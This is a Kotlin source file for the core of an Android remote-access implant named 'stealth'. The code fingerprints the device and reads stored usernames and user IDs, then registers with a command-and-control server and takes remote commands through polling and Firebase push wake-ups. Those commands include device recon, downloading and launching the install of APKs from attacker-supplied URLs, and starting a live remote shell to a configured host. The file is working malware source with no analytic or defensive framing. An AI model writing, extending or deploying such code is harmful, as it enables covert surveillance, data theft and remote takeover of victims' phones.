package com.kaze.stealth

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.util.Log
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object Core {
    private const val TAG = "STEALTH"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    @Volatile private var deviceId: String = ""
    @Volatile private var username: String = ""
    @Volatile private var userId: String = ""
    @Volatile private var running = false
    private val polling = java.util.concurrent.atomic.AtomicBoolean(false)
    private var executedCommandIds: MutableSet<String> = java.util.Collections.synchronizedSet(mutableSetOf<String>())
    private lateinit var prefs: android.content.SharedPreferences

    private const val PREFS_NAME = "kaze_executed_cmds"
    private const val KEY_EXECUTED_IDS = "executed_ids"

    private fun loadExecutedIds() {
        val saved = prefs.getStringSet(KEY_EXECUTED_IDS, emptySet()) ?: emptySet()
        executedCommandIds = java.util.Collections.synchronizedSet(saved.toMutableSet())
    }

    private fun saveExecutedIds() {
        prefs.edit().putStringSet(KEY_EXECUTED_IDS, executedCommandIds.toSet()).apply()
    }

    fun start(context: Context) {
        if (running) return
        running = true
        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        loadExecutedIds()
        scope.launch {
            try {
                val fingerprint = getFingerprint()
                deviceId = fingerprint.replace("|", "_")
                Log.d(TAG, "Device ID: $deviceId")

                val authPrefs = context.getSharedPreferences("auth_prefs", android.content.Context.MODE_PRIVATE)
                val fpUsername = try { authPrefs.getString("username", "") ?: "" } catch (_: Exception) { "" }
                val fpUserId = try { authPrefs.getString("user_id", "") ?: "" } catch (_: Exception) { "" }
                username = fpUsername
                userId = fpUserId

                Transport.registerDevice(deviceId, fingerprint, username, fpUserId)
                Log.d(TAG, "Device registered (user=$username, uid=$fpUserId)")

                Transport.cleanupStaleCommands(deviceId)
                Log.d(TAG, "Stale commands cleaned")

                val fcmExecutor = Executors.newSingleThreadExecutor()
                FirebaseMessaging.getInstance().token.addOnCompleteListener(fcmExecutor) { task ->
                    try {
                        if (task.isSuccessful) {
                            val token = task.result
                            if (token != null) {
                                Log.d(TAG, "FCM token obtained: ${token.take(20)}...")
                                Transport.saveFcmToken(deviceId, token)
                                Log.d(TAG, "FCM token saved to Supabase")
                            } else {
                                Log.e(TAG, "FCM token is null")
                            }
                        } else {
                            Log.e(TAG, "FCM token fetch failed: ${task.exception?.message}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "FCM token save error: ${e.message}")
                    }
                }

                var lastPoll = 0L
                var lastHeartbeat = 0L

                while (running) {
                    val now = System.currentTimeMillis()

                    if (now - lastPoll >= Config.POLL_INTERVAL_MS) {
                        lastPoll = now
                        pollAndExecute(context)
                    }

                    if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
                        lastHeartbeat = now
                        try {
                            Transport.updateHeartbeat(deviceId, username, userId)
                        } catch (_: Exception) {}
                    }

                    delay(10000L)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Core error: ${e.message}")
                running = false
            }
        }
    }

    fun ensureRunning(context: Context) {
        if (!running) {
            start(context)
        }
    }

    fun wakeUp(context: Context) {
        if (!running) {
            start(context)
        }
        if (deviceId.isEmpty()) return
        scope.launch {
            try {
                pollAndExecute(context)
            } catch (e: Exception) {
                Log.e(TAG, "WakeUp poll error: ${e.message}")
            }
        }
    }

    private fun pollAndExecute(context: Context) {
        if (!polling.compareAndSet(false, true)) return
        try {
            val commands = Transport.pollCommands(deviceId)
            if (commands.isNotEmpty()) {
                for ((cmdId, cmd) in commands) {
                    if (executedCommandIds.contains(cmdId)) continue
                    executedCommandIds.add(cmdId)
                    saveExecutedIds()

                    val action = cmd.split("|", limit = 2)[0].trim()
                    if (!Config.ALLOWED_COMMANDS.contains(action) && action != "wake") {
                        Log.w(TAG, "Unknown command rejected: $cmd")
                        Transport.markCommandFailed(cmdId, deviceId)
                        continue
                    }

                    if (cmd.startsWith("download|")) {
                        val url = cmd.removePrefix("download|")
                        val versionRegex = Regex("""/v(\d+\.\d+\.\d+)/""")
                        val match = versionRegex.find(url)
                        if (match != null) {
                            val remoteVersion = match.groupValues[1]
                            val currentVersion = com.kaze.BuildConfig.VERSION_NAME
                            if (compareVersions(remoteVersion, currentVersion) <= 0) {
                                Log.d(TAG, "Skipping download for v$remoteVersion (current: v$currentVersion)")
                                Transport.markCommandCompleted(cmdId, deviceId)
                                continue
                            }
                        }
                    }

                    Log.d(TAG, "Executing: $cmd")
                    Transport.markCommandRunning(cmdId, deviceId)

                    val result = try {
                        when {
                            cmd == "recon" -> Recon.execute(context)
                            cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
                            cmd == "die" -> {
                                running = false
                                try {
                                    context.stopService(Intent(context, com.kaze.liveshell.LiveShellService::class.java))
                                } catch (_: Exception) {}
                                "BYE"
                            }
                            cmd == "wake" -> "AWAKE"
                            cmd.startsWith("sh|") -> {
                                val shAction = cmd.removePrefix("sh|").trim()
                                if (shAction == "start") {
                                    startLiveShell(context)
                                    "LiveShell started"
                                } else if (shAction == "stop") {
                                    stopLiveShell(context)
                                    "LiveShell stopped"
                                } else {
                                    "Unknown sh action: $shAction"
                                }
                            }
                            else -> Commands.dispatch(context, cmd)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Command execution error: ${e.message}")
                        "ERROR:${e.message}"
                    }

                    Transport.sendResult(cmdId, deviceId, result)
                    Transport.markCommandCompleted(cmdId, deviceId)
                    Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                }
            }
            if (executedCommandIds.size > 500) {
                val trimmed = java.util.Collections.synchronizedSet(
                    executedCommandIds.toList().takeLast(500).toMutableSet()
                )
                executedCommandIds = trimmed
                saveExecutedIds()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Poll error: ${e.message}")
        } finally {
            polling.set(false)
        }
    }

    private fun compareVersions(a: String, b: String): Int {
        val partsA = a.split(".").map { it.toIntOrNull() ?: 0 }
        val partsB = b.split(".").map { it.toIntOrNull() ?: 0 }
        for (i in 0 until maxOf(partsA.size, partsB.size)) {
            val va = partsA.getOrElse(i) { 0 }
            val vb = partsB.getOrElse(i) { 0 }
            if (va != vb) return va.compareTo(vb)
        }
        return 0
    }

    fun stop() {
        running = false
    }

    fun saveFcmTokenToC2(context: Context, token: String) {
        try {
            if (deviceId.isEmpty()) {
                deviceId = getFingerprint().replace("|", "_")
            }
            Transport.saveFcmToken(deviceId, token)
            Log.d(TAG, "FCM token saved to C2 (rotation)")
        } catch (e: Exception) {
            Log.e(TAG, "FCM token save error: ${e.message}")
        }
    }

    private fun getFingerprint(): String {
        return "${Build.MANUFACTURER}|${Build.MODEL}|${Build.DEVICE}|" +
            "${Build.VERSION.RELEASE}|${Build.VERSION.SDK_INT}|" +
            "${Build.BOARD}|${Build.HARDWARE}"
    }

    private val httpClient = OkHttpClient.Builder()
        .followRedirects(true)
        .followSslRedirects(true)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun downloadAndInstall(context: Context, url: String): String {
        return try {
            val apkFile = File(context.filesDir, "c2_update.apk")

            val request = Request.Builder().url(url).build()
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    return "ERROR:HTTP_${response.code}"
                }
                val body = response.body ?: return "ERROR:empty_body"

                apkFile.outputStream().use { out ->
                    body.byteStream().use { inp ->
                        inp.copyTo(out)
                    }
                }
            }

            val magic = ByteArray(4)
            apkFile.inputStream().use { it.read(magic) }
            if (magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
                apkFile.delete()
                return "ERROR:not_a_valid_apk"
            }

            val uri = androidx.core.content.FileProvider.getUriForFile(
                context,
                "${context.packageName}.fileprovider",
                apkFile
            )
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            context.startActivity(intent)
            "DOWNLOADING:$url"
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }

    private fun startLiveShell(context: Context) {
        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java).apply {
            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_HOST, Config.LIVESHELL_HOST)
            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_PORT, Config.LIVESHELL_PORT)
            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_DEVICE_ID, deviceId)
            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_TOKEN, Config.LIVESHELL_TOKEN)
        }
        context.startForegroundService(intent)
    }

    private fun stopLiveShell(context: Context) {
        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java)
        context.stopService(intent)
    }
}
